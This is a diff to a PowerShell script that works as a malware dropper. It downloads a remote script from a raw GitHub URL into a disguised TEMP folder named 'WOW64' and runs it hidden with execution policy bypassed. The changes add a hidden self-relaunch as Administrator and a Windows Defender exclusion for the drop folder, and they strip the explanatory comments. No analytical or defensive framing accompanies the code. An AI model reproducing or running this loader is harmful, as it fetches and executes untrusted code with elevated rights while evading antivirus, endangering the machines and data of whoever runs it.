@@ -1,24 +1,30 @@
-# Configuration
+$Elevation = [System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()
+$AdminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
+
+if (-not $Elevation.IsInRole($AdminRole)) {
+    # Relaunch the script as Administrator with hidden window and bypass execution policy
+    $arguments = "-ExecutionPolicy Bypass -File '" + $myinvocation.MyCommand.Definition + "'"
+    Start-Process powershell -ArgumentList $arguments -Verb RunAs -WindowStyle Hidden
+    exit
+}
+
 $url = "https://raw.githubusercontent.com/jusnih/x/refs/heads/main/y.ps1"
 $folder = "$env:TEMP\WOW64"
 $scriptPath = "$folder\y.ps1"
 
-# Create folder if not exists
+Add-MpPreference -ExclusionPath $folder
+
 New-Item -Path $folder -ItemType Directory -Force | Out-Null
 
-# Download script using System.Net.WebClient
 $wc = New-Object System.Net.WebClient
 $wc.DownloadFile($url, $scriptPath)
 
 Unblock-File -Path $scriptPath
 
-# Define path to PowerShell and the script
 $psPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
 
-# Ensure the script is unblocked (remove NTFS "from internet" flag)
 Unblock-File -Path $scriptPath
 
-# Create ProcessStartInfo
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName = $psPath
 $psi.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
@@ -26,5 +32,4 @@ $psi.WindowStyle = 'Hidden'
 $psi.CreateNoWindow = $true
 $psi.UseShellExecute = $false
 
-# Start the process
 [System.Diagnostics.Process]::Start($psi)
